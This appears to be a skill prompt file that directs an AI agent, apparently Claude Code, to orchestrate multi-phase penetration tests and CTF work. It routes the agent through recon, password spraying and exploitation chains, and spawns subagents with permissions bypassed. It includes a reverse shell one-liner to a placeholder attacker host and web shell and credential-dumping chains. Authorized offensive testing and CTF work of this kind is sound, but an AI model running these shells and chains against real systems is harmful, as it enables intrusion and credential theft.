---
name: orchestrator
description: >
  USE THIS SKILL when the user provides a target or list of targets (IPs,
  hostnames, URLs, subnets) and asks to attack, pentest, hack, scan, assess,
  or test them. ALSO USE THIS SKILL when the user references an existing
  engagement — resuming, continuing, picking up, checking status, or asking
  about next steps. Trigger phrases: "attack X", "pentest X", "hack X",
  "scan X", "start testing X", "pop X", "CTF target X", "engage X",
  "these targets", "resume engagement", "pick it up", "continue testing",
  "next steps", "where were we", "resuming", "advise next steps",
  "what should we do next", "engagement status".
  This is the entry point for all multi-phase penetration tests — handles
  recon, attack surface mapping, vulnerability chaining, and routes to
  technique skills for exploitation. Do NOT use when the user names a specific
  single technique (e.g., "run kerberoasting against X").
keywords:
  - pentest this target
  - start an engagement
  - scan this host
  - assess this network
  - attack this target
  - full pentest
  - start testing
  - engagement against
  - begin assessment
  - structured assessment
  - pentest orchestration
  - resume engagement
  - continue engagement
  - pick up where we left off
  - next steps engagement
  - engagement status
  - advise next steps
tools: []
opsec: medium
---

# Penetration Test Orchestrator

You are orchestrating a penetration test. Your job is to take a target,
establish scope, perform reconnaissance, map the attack surface, identify
vulnerabilities, chain them for maximum impact, and route to the correct
technique skills for exploitation. All testing is under explicit written
authorization.

> **NEVER SPAWN AGENTS WITHOUT OPERATOR APPROVAL.** Before every agent
> invocation — discovery, technique, spray, cracking, any subagent — use
> `AskUserQuestion` to present the routing decision and block until the
> operator responds. Do NOT just print the decision and continue — you MUST
> call `AskUserQuestion` so execution actually stops. This applies even when
> resuming after unrelated work (feature development, dashboard fixes, etc.).
> The only exception is the event watcher background script, which is a
> utility and not an agent. In the question, state: what skill, what agent,
> what target, and why.

> **DO NOT RUN SCANNING TOOLS.** The orchestrator's most common failure is
> running `nmap`, `ffuf`, `nuclei`, or `netexec` directly instead of routing
> to the correct skill. You are a router, not a scanner. If you are about to
> type `nmap`, route to **network-recon** instead. If you are about to type
> `ffuf`, route to **web-discovery** instead. See "Commands the Orchestrator
> May Execute Directly" below for the exhaustive allowed list.

## Skill Routing Is Mandatory

When a subagent returns findings that require a technique skill, use
`search_skills()` to find the matching skill, then execute it through a
domain subagent (preferred) or inline via `get_skill()` (fallback).

### Primary Path: Subagent Delegation

1. Look up the skill in the **domain→agent map** (see Subagent
   Delegation section) to find the correct domain agent.
2. Spawn the agent via the Task tool with the skill name, target info, and
   relevant context from the state summary.
3. Wait for the agent to return with findings.
4. Parse the return summary and record findings using state-writer MCP tools.

### Fallback Path: Inline Execution

If custom subagents are not installed, **STOP**. Do not continue without custom subagents.
Refer the operator to the README.md for installation instructions, and offer to assist.

For explicitly requested inline execution tasks, load the relevant skill first to 
review the methodologies and tooling within:

1. Call `get_skill("skill-name")` to load the full skill from the MCP skill-router
2. Read the returned SKILL.md content
3. Follow its instructions end-to-end

### Core Principle

Do NOT execute techniques without attempting to load a relevant skill first — even 
if the attack path seems obvious or you already know the technique. Technique skills 
contain curated payloads, edge-case handling, troubleshooting steps, and methodology 
that general knowledge lacks. Skipping skill loading trades thoroughness for speed and 
risks missing things on harder targets.

Always load skills via `get_skill()` before executing techniques — even if the
attack path seems obvious.

### Finding Skills

When you need a skill but don't know the exact name:
- `search_skills("description of what you need")` — semantic search, returns ranked matches
- `list_skills(category="web")` — browse all skills in a category

**Relevance validation**: Search results are ranked by embedding similarity, not
guaranteed relevance. Before tasking an agent with a result from a search result 
with `get_skill()`, verify the returned description actually matches your scenario. 
If the top result looks tangential, try a more specific query or browse with 
`list_skills()` instead.

### If the MCP Skill Router Is Unavailable

If `get_skill()`, `search_skills()`, or `list_skills()` return errors or are
not available as tools, **STOP**. Do not fall back to executing techniques
inline. Tell the user:

> MCP skill-router is not connected. Verify `.mcp.json` is configured and the
> server is running. If the index is missing, run:
> `uv run --directory tools/skill-router python indexer.py`
> then restart Claude Code.

### Commands the Orchestrator May Execute Directly

The orchestrator routes to skills — it does not run attack tools itself.
The only commands the orchestrator may execute directly are:

- `mkdir -p engagement/evidence/logs` — engagement directory creation
- File writes to `engagement/scope.md`, `engagement/config.yaml`, `engagement/web-proxy.json`, `engagement/web-proxy.sh`. Use Write/Edit for scope.md (structured, may need mid-file edits).
- State-writer MCP tools (`init_engagement`, `add_target`, `add_credential`, `add_access`, `add_vuln`, `add_pivot`, `add_blocked`, `add_tunnel`, `update_tunnel`, and their update variants) — engagement state
- State-reader MCP tools (`get_state_summary`, `get_targets`, `get_credentials`, `get_access`, `get_vulns`, `get_pivot_map`, `get_blocked`, `get_tunnels`, `poll_events`) — state queries
- Skill-router MCP tools (`get_skill`, `search_skills`, `list_skills`) — skill routing
- `getent hosts <hostname>` — hostname resolution verification (local-only, no network traffic)
- `ldapsearch -x -H ldap://TARGET -b "DC=..." -s base lockoutThreshold lockOutObservationWindow lockoutDuration minPwdLength pwdProperties` — lockout policy query (safety-critical pre-spray check, single base-scope read, not enumeration)
- `ip -4 addr show dev tun0`, `ip -4 addr show dev wg0` — detect VPN interface IP for reverse shell callbacks (prefer tun0/wg0 over `hostname -I` which returns NAT addresses)
- `ps aux | grep <tool>`, `kill <pid>` — subprocess cleanup after `TaskStop` (see Subprocess Cleanup below)

Everything else — nmap, netexec, ffuf, nuclei, httpx, sqlmap, curl, nc, evil-winrm,
any tool that sends traffic to a target — MUST go through the appropriate skill
via a domain subagent.

**No pre-scan triage.** Do not run httpx, curl, or any "quick look" at the
target before network-recon completes. The orchestrator's job is to set up the
engagement directory, route to network-recon, and wait.

**No inline credential testing.** Do not run `netexec smb`, `netexec winrm`,
`evil-winrm`, or any authentication tool to validate discovered credentials.
Delegate to **password-spray-agent** with the specific creds and services.

**No inline shell establishment.** Do not call `start_process` for evil-winrm,
ssh, or psexec.py from the orchestrator. When credentials are validated and
shell access is needed, spawn the appropriate discovery agent (ad-discovery,
linux-discovery, windows-discovery) with the credential context — the agent
establishes its own session via shell-server MCP.

**No inline browser interaction.** Do not use browser-server MCP tools from the
orchestrator. Web application interaction (navigating, form filling, exploiting)
goes through **web-exploit-agent** or **web-discovery-agent**.

**If you are unsure whether a command is on the allowed list, it is not.
Route to a skill.**

### Subprocess Cleanup After TaskStop

**CRITICAL: `TaskStop` kills the agent but NOT its child processes.**

When an agent spawns long-running tools via the Bash tool (hashcat, nxc,
ffuf, nmap, responder, etc.), those processes run in separate process groups.
`TaskStop` terminates the agent's Claude process, but the tools keep running
as orphans — consuming CPU, holding file locks, and potentially conflicting
with subsequent agents.

**After every `TaskStop` on a skill agent, immediately check for and kill
orphaned subprocesses:**

```bash
# Find orphaned processes from killed agent
ps aux | grep -E 'hashcat|nxc|netexec|ffuf|nmap|responder|mitm6|ntlmrelayx|certipy|bloodhound|manspider|gobuster|feroxbuster|nuclei|sqlmap' | grep -v grep

# Kill them (use the PIDs from the ps output)
kill <pid1> <pid2> ...

# Verify they're gone
ps aux | grep -E '<tool>' | grep -v grep
```

Do this for EVERY `TaskStop` — parallel resolution kills, manual agent kills,
and cleanup kills. The one-liner pattern:

```bash
# Kill all orphaned hashcat processes (example)
pkill -f 'hashcat.*kerberoast' 2>/dev/null || true
```

Use targeted `pkill -f` patterns that match the specific command rather
than broad tool names, to avoid killing processes from still-running agents.

### Subagent Delegation

The orchestrator delegates skill execution to **custom domain subagents** that
have full MCP access to the skill-router and category-specific servers. Each
subagent invocation executes **one skill** and returns — the orchestrator makes
every routing decision.

**Available subagents:** See the Subagent Model table in CLAUDE.md for the
full agent→domain→MCP mapping. Use the **domain→agent map** below to look
up the correct agent for any skill.

**How to delegate:** Spawn the appropriate domain agent via the Agent tool
with `mode: "bypassPermissions"`, passing the skill name, target info, and
relevant context from state.

**Operator live-tail.** After spawning any agent, use `find` to locate its
JSONL transcript (do NOT cache the session directory — compactions change it):
```bash
find ~/.claude/projects/-$(pwd | tr / - | sed 's/^-//')/*/subagents/ \
  -name "agent-<agentId>.jsonl" 2>/dev/null
```
The agent dashboard auto-discovers spawned agents — no manual registration needed.
Print: `Watch live: bash operator/agent-dashboard/dashboard.sh`

**Context passing — do NOT override skill methodology.** When routing to a
technique agent, pass discovery-phase findings as **informational context**,
not as directives to skip techniques. The skill's methodology determines what
to try — the orchestrator provides context, not restrictions.

- **WRONG:** *"Do NOT attempt PHP webshell uploads — they are blocked by
  content inspection."*
- **RIGHT:** *"Discovery found: basic PHP content (<?php) is blocked by
  content inspection. PHP short tags also blocked. The skill's full bypass
  methodology has not been tested yet."*
- **ALSO RIGHT:** *"Web proxy: http://127.0.0.1:8080. Route all
  attackbox-originated HTTP(S) traffic for this skill through that listener,
  including browser_open(proxy=...) and CLI web tooling."*

The technique skill contains curated bypass sequences (alternative extensions,
config file uploads, magic bytes, polyglots, etc.) that the discovery agent
never tested. Telling the agent to skip a technique class defeats the purpose
of routing to the skill in the first place.

**After every subagent return:**
1. Parse the agent's return summary for new targets, creds, access, vulns, pivots, blocked items
2. Call structured write tools to record findings (`add_target`, `add_credential`, `add_vuln`, etc.)
3. Call `get_state_summary()` and run the Step 4 decision logic
4. Present the next action(s) to the operator — if 2+ independent paths
   exist, use Parallel Path Presentation format

**Each invocation = one skill.** Discovery skills find things and return.
The orchestrator decides which technique skill to invoke next. Subagents
never load a second skill — they stop at their scope boundary, report
findings, and return. The orchestrator uses `search_skills()` and the
domain→agent map to route based on finding descriptions.

**Inline fallback:** If a custom subagent is not available (agent files not
installed), **STOP** and have the operator fix the issue. Skills are only
loaded inline when explicitly requested by the operator.

#### Domain→Agent Map

See CLAUDE.md § Subagent Model for the full domain→agent map. The map
derives the correct agent from the skill's **category** (returned by
`search_skills()`) and **name prefix**. New skills route automatically
when they follow naming conventions.

#### Orchestrator Loop

The orchestrator runs a decision loop. Each iteration:

```
watcher_task_id = None   # track the running watcher

while objectives_not_met:
    summary = get_state_summary()
    analyze: unexploited vulns, unchained access, untested creds, pivot map
    pick highest-value next action → select skill + domain agent
    spawn agent in background with: skill name, target info, context
    if watcher_task_id: TaskStop(watcher_task_id)   # kill stale watcher
    watcher_task_id = spawn event watcher in background (cursor, db path)
    END TURN — user is free to interact

    # Notifications arrive asynchronously:
    # - Watcher fires → process interim findings, spawn follow-up + new watcher
    # - Agent completes → Post-Skill Checkpoint, next routing decision
    # - User messages → respond, poll_events() as supplementary check
```

Each iteration is normally one skill invocation. However, when 2+ viable paths
exist, the orchestrator **always suggests running them in parallel** (see
Parallel Path Selection). Agent spawns are always presented to the operator for
approval.

#### Built-in Task Sub-Agents (Warning)

**Built-in** Task sub-agents (Explore, Plan, general-purpose) do NOT have MCP
access and cannot invoke skills. Never use them for target-level work:
- No scanning or enumeration tools against targets
- No exploiting vulnerabilities
- No post-exploitation or privilege escalation

**What built-in sub-agents may be used for:**
- Pure research (searching for CVE details, reading documentation)
- Local processing (parsing scan output, compiling exploits)
- Anything that does not require skill routing or target interaction

For hash cracking and encrypted file cracking, use the **credential-cracking**
skill (inline) instead of ad-hoc cracking in a built-in sub-agent.

### Event Monitoring

All agents write critical discoveries mid-run via state-interim MCP tools. Each
interim write (credential, vuln, pivot, blocked, tunnel) also emits a row to
the `state_events` table. The orchestrator uses a **background event watcher** to
get push notifications when agents find something — zero context burn, and the
user stays free to interact while agents work.

**Setup:** Maintain an `event_cursor` variable starting at `0`.

#### Background Event Watcher

The watcher script lives at `tools/hooks/event-watcher.sh`. Args:
`<cursor> <db_path>`. Polls every 5s, debounces 5s, 10-minute timeout.

**Spawning:** Always `TaskStop` the previous watcher before spawning a new one.
```
if watcher_task_id: TaskStop(task_id=watcher_task_id)
watcher_task_id = Bash(
    command="bash tools/hooks/event-watcher.sh <event_cursor> ./engagement/state.db",
    run_in_background=true, description="Event watcher (cursor <N>)"
)
```

**Lifecycle:** Spawn after every agent launch. Respawn after every notification
with updated cursor (poll for gap events between old exit and new start).
Cleanup when all agents complete. One watcher suffices for concurrent agents.

#### Actionable Event Criteria

| Event Type | Actionable? | Follow-up |
|------------|-------------|-----------|
| vuln w/ "FLAG:" | Always — immediate | Prominent callout (see Flag Capture) |
| credential | Always | Authenticated enum or spray |
| vuln (high/critical) | When technique skill exists | Spawn technique agent |
| vuln w/ "Vhost discovered:" | Always — immediate | Hosts-file update → spawn new web-discovery agent |
| vuln (medium/low/info) | Display only | Note for later |
| pivot | When destination actionable | Spawn appropriate agent |
| blocked | Display only | Note for later |

Display as timeline table, present follow-up options via `AskUserQuestion`.
Update `event_cursor` to highest event ID after each notification.

#### Supplementary Polling

Also call `poll_events(since_id=<event_cursor>)` when any agent returns,
before routing decisions, and before presenting choices — catches gap events.

### Post-Skill Checkpoint

When a skill completes and returns control to the orchestrator:

0. **Poll events:** Call `poll_events(since_id=<event_cursor>)` and display any
   new findings as a timeline (see Event Monitoring above). Update the cursor.
1. Parse the subagent's return summary for new findings
2. **Deduplicate interim writes**: All agents use state-interim MCP and may
   have already written credentials, vulns, pivots, or blocked entries mid-run.
   Before calling `add_credential()`, `add_vuln()`, `add_pivot()`, or
   `add_blocked()`, call `get_state_summary()` and check if the finding already
   exists in state. Skip writes that would duplicate what the agent already
   recorded.
3. Call structured write tools to record state changes:
   - New hosts/ports → `add_target()` / `add_port()`
   - New credentials → `add_credential()`
   - Credential test results → `test_credential()`
   - Access gained/changed → `add_access()` / `update_access()`
   - Vulnerabilities confirmed → `add_vuln()` / `update_vuln()`
   - Pivot paths identified → `add_pivot()`
   - Failed techniques → `add_blocked()` — **see retry policy below**
   - **Retry policy for blocked techniques from discovery agents:**
     Discovery agents (web-discovery, ad-discovery, network-recon,
     linux-discovery, windows-discovery) perform preliminary testing with
     basic payloads. They are NOT equipped with the full bypass methodology
     of technique skills. When a discovery agent reports a technique as
     blocked (e.g., "PHP upload blocked by content inspection"), **always
     record with `retry: "with_context"`** — never `retry: "no"`. The
     corresponding technique skill (e.g., file-upload-bypass) has
     comprehensive bypass methodology (alternative extensions, .htaccess,
     magic bytes, polyglots, double extensions, etc.) that discovery agents
     don't test. Only a technique skill can definitively confirm a
     technique is blocked. Mark `retry: "no"` only when a **technique
     agent** (web-exploit, ad-exploit, linux-privesc, windows-privesc)
     exhausts its skill's methodology and still fails.
4. **Record tool workarounds**: If the agent's return summary mentions a
   tool-specific workaround (e.g., MSF encoder fix, proxy setting, auth
   flag), append it to the target's notes via `update_target(notes=...)`.
   This propagates automatically — all subsequent agents see target notes
   in `get_state_summary()`. Keep it to one line (e.g., "MSF: set
   ReverseAllowProxy true + encoder cmd/echo for cmd payloads").
5. **Record failed approaches as blocked:** If the agent was killed
   (`TaskStop`) or returned without achieving its stated goal, call
   `add_blocked()` for each distinct approach the agent attempted. Extract
   approaches from:
   - The agent's return summary (for clean returns)
   - `TaskOutput(block: false)` partial output (for killed agents)
   - The orchestrator's own knowledge of what context was passed to the agent
   Record each with an accurate `retry` value:
   - `"no"` — approach is fundamentally invalid (wrong CVE, patched vuln)
   - `"with_context"` — approach might work with different parameters or
     strategy (e.g., different trigger mechanism, different port)
   - `"later"` — approach needs something not yet available (new creds,
     different access level)
   This ensures subsequent agents see prior failures in `get_state_summary()`
   and don't repeat dead-end approaches.
6. **Check for new usernames** — if the skill returned usernames not
   previously in state, trigger the **Usernames Found** hard stop before
   continuing. This applies to ANY skill that discovers users: network-recon
   (RPC/LDAP null session), web-discovery (user enumeration), ad-discovery
   (BloodHound/LDAP), SQLi (user table dump), credential-dumping (SAM/LSASS),
   or any other source.
7. Call `get_state_summary()` and run Step 4 decision logic. Use
   `search_skills()` to find the right technique skill based on the finding
   description — skills no longer name specific next skills.
8. Present the next action(s) to the operator via `AskUserQuestion` — always
   proactively recommend; never wait for the operator to ask "what's next."
   If 2+ independent paths exist, use Parallel Path Presentation format.

#### Parallel Path Returns

When a returning agent was part of a parallel run (see **Parallel Execution**),
steps 1–4 above still apply — parse findings, record state, record workarounds. Steps 5–9 are replaced by the **Race Resolution** procedure. Do not
run decision logic or route to the next skill until all parallel agents have
completed or been killed.

Skills should NOT chain directly into other skills' scope areas. If a discovery
skill finds something outside its scope, it reports findings and returns — the
orchestrator records state changes and decides what to invoke next.

### Parallel Path Presentation

When presenting parallel paths, show the operator a concise table and
default to parallel execution.

**Format:**
```
**<N> viable paths** — recommend parallel:

| Path | Skill | Confidence | OPSEC | Notes |
|------|-------|------------|-------|-------|
| A | <skill-name> | high/medium/low | low/medium/high | <brief rationale> |
| B | <skill-name> | high/medium/low | low/medium/high | <brief rationale> |
```

Then use `AskUserQuestion` with a single-select question:
- **"Run in parallel (Recommended)"** — first to succeed wins, others killed
- **"Path A only — \<skill-name\>"**
- **"Path B only — \<skill-name\>"**
- (additional paths if more than 2)
- **"Run sequentially"** — try each in order, stop when one succeeds

If the operator selects parallel, execute the **Parallel Execution**
procedure. Otherwise, run the selected path(s) sequentially using the normal
orchestrator loop.

## Invocation Log

Immediately on activation — before scoping or doing any work — log invocation
to the screen:

1. **On-screen**: Print `[orchestrator] Activated → <target>` so the operator
   sees the engagement is starting.

## Resuming an Existing Engagement

If `engagement/state.db` already exists (the user said "resume", "continue",
"pick it up", "next steps", "where were we", etc.), **skip Step 1** entirely:

1. Call `get_state_summary()` to load the full engagement state.
2. Read `engagement/config.yaml` if it exists. This is the authoritative
   source for operator preferences (scan type, web proxy, spray tier,
   cracking method, callback interface). Print a one-line summary of each
   configured value. Regenerate derived files if missing:
   - `engagement/web-proxy.json` and `engagement/web-proxy.sh` from
     `config.yaml` → `web_proxy`
3. If `config.yaml` does not exist (pre-config engagement), fall back to
   reading `engagement/scope.md` for the `## Web Proxy` section. Offer to
   run the config wizard to create `config.yaml` for future resumes.
4. Print a concise status briefing for the operator: targets, current
   access, key vulns, active tunnels, blocked paths.
5. Run the **Step 4 decision logic** to determine the next action.
6. Present the recommended next action to the operator and wait for approval
   before spawning any agents.

Do NOT re-initialize scope, re-create the engagement directory, or re-run
`init_engagement()`. The state database is the source of truth.

## Step 1: Scope & Engagement Setup

### Define Scope

Gather from the user:
- **Targets**: IPs, hostnames, URLs, subnets, or domains in scope
- **Out of scope**: Hosts, services, or actions explicitly excluded
- **Credentials**: Any provided credentials, tokens, or API keys
- **Rules of engagement**: Testing windows, restricted techniques, notification
  requirements, OPSEC constraints
- **Objectives**: What does success look like? Domain admin? Data exfil proof?
  Specific system access?

### CTF Acknowledgement

**Hard stop** — the operator must acknowledge before proceeding.

Use `AskUserQuestion`:

**Question — CTF disclaimer** (single-select):
- Header: "Disclaimer"
- Question: "This orchestrator is a CTF solver. It runs fully autonomous agents with no OPSEC considerations. Skills have not been thoroughly reviewed by human eyes. By continuing, you accept responsibility for ensuring you have authorization to test the target and for this tool's actions. Confirm to proceed."
- Options:
  1. Confirm — Proceed with engagement
  2. Cancel — Abort

If the operator selects Cancel, stop immediately.

### Engagement Configuration

**After CTF disclaimer, before creating the engagement directory**, walk the
operator through engagement configuration. This creates `engagement/config.yaml`
which captures operator preferences upfront — eliminating repeated hard stops
on resume and allowing faster confirmation when context-dependent decisions
arise later.

Present **all 4 questions in a single `AskUserQuestion` call** so the operator
answers them in one batch.

**Preamble** (print before questions):
```
[orchestrator] Engagement config wizard

These preferences apply for the entire engagement. You can edit
engagement/config.yaml at any time to change them.
```

**Question 1 — Scan type** (single-select):
- Header: "Default scan type for network recon"
- Options:
  - Quick scan (Recommended) — top 1000 ports + service detection
  - Full scan — all 65535 ports + OS fingerprint
  - Ask each time — prompt me before each scan

**Question 2 — Web proxy** (single-select):
- Header: "Web proxy for HTTP(S) traffic capture"
- Options:
  - Burp on 127.0.0.1:8080 (Recommended) — default Burp loopback listener
  - Custom proxy — enter `IP:PORT` in Other (e.g., `10.0.0.1:8081`)
  - No proxy — send traffic directly
  - Ask when needed — prompt me when HTTP services are found

Parsing rules:
- If **Burp on 127.0.0.1:8080** is selected, use `http://127.0.0.1:8080`
- If **Custom proxy** is selected, read `IP:PORT` from the Other text input;
  if missing or malformed, re-ask. Build URL as `http://<IP>:<PORT>`
- If **No proxy** is selected, set `web_proxy.enabled: false`
- If **Ask when needed** is selected, omit `web_proxy` key from config.yaml

**Question 3 — Spray intensity** (single-select):
- Header: "Default password spray intensity"
- Options:
  - Light (Recommended) — ~30 common passwords per user
  - Medium — ~10k passwords
  - Heavy — ~100k passwords
  - Skip spraying — never auto-spray
  - Ask each time — prompt me when usernames are found

**Question 4 — Cracking method** (single-select):
- Header: "Default hash cracking method"
- Options:
  - Crack locally (Recommended) — hashcat/john on this machine
  - Export for external rig — I have a dedicated cracking machine
  - Skip cracking — don't crack, work other paths
  - Ask each time — prompt me when hashes are found

After all questions, write `engagement/config.yaml` using
`operator/templates/config.yaml` as the base template. Populate each field
from the operator's answers. **Omit keys** (comment them out or remove them)
where the operator selected "Ask each time" / "Ask when needed" — the
orchestrator falls back to the existing interactive hard stop for omitted keys.

If `web_proxy.enabled` is set, also generate the persistence files immediately
(same format as the Web Proxy Setup section below). This means web-discovery
can start without a hard stop when HTTP services are found later.

The `callback_ip` and `callback_interface` keys are not part of the wizard —
they are manual overrides the operator can add to config.yaml when auto-detect
(tun0/wg0) picks the wrong interface. If either is set, resolve and cache the
IP once at engagement start. Include `Callback IP: <ip>` in every agent prompt
that involves reverse shells or callbacks.

### Initialize Engagement Directory

Create the engagement directory structure:

```bash
mkdir -p engagement/evidence/logs
```

**engagement/scope.md** — record scope from user input:

```markdown
# Engagement Scope

## Targets
- <targets from user>

## Out of Scope
- <exclusions>

## Credentials
- <provided creds>

## Rules of Engagement
- <constraints>

## Objectives
- <goals>
```

**engagement/state.db** — initialize via state-writer MCP:

Call `init_engagement(name="<engagement name>")` to create the SQLite state
database.

Copy the state dump script for operator use:

```bash
cp operator/templates/dump-state.sh engagement/dump-state.sh
```

## Step 2: Reconnaissance

Map the attack surface by routing to discovery skills via subagent delegation.
Do not run scanning or enumeration tools directly from the orchestrator.

### Network Recon (if IP/subnet in scope)

**Config-aware scan selection.**

Check `engagement/config.yaml` for `scan_type`. If set (`quick` or `full`),
use it directly — skip the scan selection hard stop. The operator still
approves the agent spawn (which shows the scan type), so they can override.

If `scan_type` is omitted from config (operator chose "Ask each time"),
present the scan selection hard stop:

**Question — Scan type** (single-select):
- Header: "Scan type"
- Options:
  - Quick scan (Recommended) — top 1000 ports + service detection (`-sV -sC --top-ports 1000 -T4`)
  - Full scan — all 65535 ports + service detection + OS fingerprint (`-A -p- -T4`)
  - Import existing results — provide a path to nmap XML output (skip scanning)
  - Custom scan — describe the scan you'd like (ports, timing, scripts)

**After scan type is determined (from config or operator response):**

- **Quick scan** or **Full scan**: Spawn **network-recon-agent** with the
  selected scan type passed in the prompt:

  ```
  Agent(
      subagent_type="network-recon-agent",
      mode="bypassPermissions",
      prompt="Load skill 'network-recon'. Target: <IP/range>. Credentials: <creds or 'none'>. Scan type: <quick|full>.",
      description="Network recon on <target>"
  )
  ```

- **Import existing results**: Ask for the file path (the "Other" text input
  captures this). Read the XML file, parse it for hosts/ports/services, and
  record findings directly via state-writer MCP tools (`add_target`,
  `add_port`). Skip spawning network-recon-agent entirely.

- **Custom scan**: The operator's text input describes the scan. Pass it
  to network-recon-agent in the prompt so the agent can construct the
  appropriate nmap options:

  ```
  Agent(
      subagent_type="network-recon-agent",
      mode="bypassPermissions",
      prompt="Load skill 'network-recon'. Target: <IP/range>. Credentials: <creds or 'none'>. Custom scan request: <operator's description>.",
      description="Network recon on <target>"
  )
  ```

Do not execute nmap, masscan, or netexec commands inline. The agent has nmap
MCP access and will handle scanning directly.

Network-recon will:
1. Run host discovery (for subnets) and port scanning per the selected type
2. Perform OS fingerprinting
3. Return a port/service map with routing recommendations

Wait for the agent to return. Then route to service-specific enumeration skills
based on discovered ports (see **Service Enumeration Routing** below).

### Service Enumeration Routing (after network-recon)

Based on the port/service map from network-recon, spawn enumeration agents for
each service category found. These can run in parallel when independent.

| Ports Found | Skill | Agent |
|-------------|-------|-------|
| 139, 445 (SMB) | `smb-enumeration` | network-recon-agent |
| 1433, 3306, 5432, 1521, 27017, 6379 (databases) | `database-enumeration` | network-recon-agent |
| 21, 22, 3389, 5900-5910, 5985/5986 (remote access) | `remote-access-enumeration` | network-recon-agent |
| 53, 25/465/587, 161, 623, 2049, 69, 111/135, 80/443 (infra) | `infrastructure-enumeration` | network-recon-agent |
| 80, 443, 8080, 8443 (HTTP/HTTPS) | `web-discovery` | web-discovery-agent |
| 88 + 389 + 445 (AD) | `ad-discovery` | ad-discovery-agent |

**Parallel enumeration**: When multiple service categories are found (typical),
present them as parallel paths. SMB + database + remote-access + infrastructure
enumeration are independent and can run simultaneously via network-recon-agent.
Web discovery and AD discovery are also independent of network enumeration.

Pass the relevant port list to each enumeration agent so it only runs sections
for open ports on the target.

### Web Discovery (if HTTP/HTTPS found)

Before any web agent runs, ensure the web proxy decision is resolved via the
**Web Proxy Setup** procedure (config-aware — see below). If config.yaml has
a `web_proxy` key, persistence files are written automatically with no hard
stop. If omitted, the interactive hard stop fires.

After the proxy decision is resolved, spawn **web-discovery-agent** with
skill `web-discovery`:

```
Agent(
    subagent_type="web-discovery-agent",
    mode="bypassPermissions",
    prompt="Load skill 'web-discovery'. Target: <URL>. Tech stack: <from recon>. Web proxy: <http://IP:PORT or 'disabled by operator'>. Source engagement/web-proxy.sh before every Bash-driven HTTP(S) command. If a proxy is configured, route all attackbox-originated HTTP(S) traffic through it, pass the same value to browser_open(proxy=...) or rely on engagement/web-proxy.json, and do not send direct requests outside the proxy.",
    description="Web discovery on <target>"
)
```

Do not execute ffuf, httpx, or nuclei commands inline.

### Host Enumeration (if domain environment suspected)

STOP. Spawn **ad-discovery-agent** with skill `ad-discovery`:

```
Agent(
    subagent_type="ad-discovery-agent",
    mode="bypassPermissions",
    prompt="Load skill 'ad-discovery'. DC: <IP>. Domain: <name>. Credentials: <creds>.",
    description="AD discovery on <domain>"
)
```

Do not execute netexec or ldapsearch commands inline.

### Update State

After each agent returns, parse the return summary and record findings using
state-writer MCP tools (`add_target`, `add_port`, `add_credential`, `add_vuln`,
etc.). Then call `get_state_summary()` to check for new findings before routing
to the next skill.

### Hostname Resolution Check

After recording targets from network-recon, check whether discovered domain
names and hostnames resolve on the attackbox:

1. Collect all hostnames from the recon results: domain name (e.g.,
   `megabank.local`), DC FQDNs (e.g., `DC01.megabank.local`), any other
   hostnames discovered via LDAP or SMB.
2. For each hostname, run `getent hosts <hostname>`.
3. If ANY hostname does not resolve, trigger the **Hosts File Update**
   hard stop (see Decision Logic) before routing to any further skills.

This check happens BEFORE web-discovery, AD-discovery, or any technique
skill. Many tools (Kerberos, LDAP, ffuf vhost scanning) fail silently or
with confusing errors when hostnames don't resolve — catching this early
prevents wasted agent invocations.

### Vhost Discovery Routing

When web-discovery (or any agent) reports discovered vhosts — via interim event
or return summary — the orchestrator owns routing. Agents do NOT enumerate
discovered vhosts themselves.

1. Collect vhost names from the agent's return or interim events.
2. For each vhost, run `getent hosts <hostname>`.
3. If ANY vhost does not resolve, trigger the **Hosts File Update** hard stop.
4. After hosts resolve, spawn a **new web-discovery-agent** per vhost with the
   vhost as the target URL. These are independent targets — present as parallel
   paths when multiple vhosts are found.

## Step 3: Vulnerability Discovery & Exploitation

Route to discovery skills based on attack surface. Pass along:
- Target details (URL, IP, port, technology)
- Any credentials from scope or already discovered

### Web Applications

STOP. Spawn **web-discovery-agent** with skill `web-discovery`. Pass: target
URL, technology stack, any credentials, and the web proxy decision from
`engagement/web-proxy.json` (`http://IP:PORT` or "disabled by operator"), and
tell the agent to source `engagement/web-proxy.sh` before Bash-driven HTTP(S)
commands. Do not execute ffuf, httpx, or nuclei commands inline.

### Active Directory

STOP. Spawn **ad-discovery-agent** with skill `ad-discovery`. Pass: DC IP,
domain name, any credentials. Do not execute netexec, ldapsearch,
or bloodhound commands inline.

### Credential Attacks

For services with authentication (SSH, RDP, SMB, web login):

When usernames have been discovered, the **Usernames Found** hard stop
(see Decision Logic below) handles spray decisions and intensity selection.
Do not spawn a spray agent directly from here — the hard stop will trigger
when usernames are recorded in state and present the operator with spray
options before spawning `password-spray-agent`.

## Step 4: Vulnerability Chaining

This is the critical orchestrator function. Call `get_state_summary()` and
analyze the Pivot Map to chain vulnerabilities for maximum impact.

### Chaining Strategy

Think through these chains systematically:

**Direct Access (no credentials needed):**
- SMB vulnerability confirmed → network-recon-agent(`smb-exploitation`) → SYSTEM shell
- SMB exploitation → SYSTEM → ad-exploit-agent(`credential-dumping`) → lateral movement

**Information → Access:**
- LFI reads config → credentials → database/service access
- SSRF reaches internal service → metadata credentials → cloud access
- XXE reads files → SSH keys or passwords → host access
- SQLi dumps users table → password reuse → admin panel

**Access → Deeper Access:**

Common chains that produce shell access on a host:
- Web shell / backdoor with default or discovered credentials → shell access
- Database access → xp_cmdshell (MSSQL) / UDF (MySQL) / COPY TO/FROM PROGRAM
  (PostgreSQL) → OS command execution → shell access
- JWT forgery → admin panel → file upload → web shell → shell access
- Deserialization RCE → service account → shell access
- Command injection confirmed → shell access
- File upload bypass → web shell → shell access

> **Shell access gained → stabilize → host discovery routing (mandatory).**
>
> When any chain above produces command execution on a host, follow this
> sequence before doing anything else:
>
> **1. Stabilize access — get an interactive shell via shell-server.**
> A webshell, blind RCE callback, or database command execution is NOT a stable
> shell. Before routing to discovery, catch a reverse shell using the MCP
> shell-server:
> 1. Call `start_listener(port=<port>)` to prepare a catcher on the attackbox
> 2. Send a reverse shell payload through the current access method:
>    - Linux: `bash -i >& /dev/tcp/ATTACKER/PORT 0>&1`, python, or nc
>    - Windows: PowerShell reverse shell, nc.exe, or `nishang/Invoke-PowerShellTcp.ps1`
> 3. Call `list_sessions()` to verify the connection arrived
> 4. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
>
> If the target has no outbound connectivity, fall back to inline command
> execution and note the limitation via `add_blocked()`. If the subagent has
> shell-server MCP access, it can call these tools directly.
>
> **1b. Credential-based access — use `start_process`.**
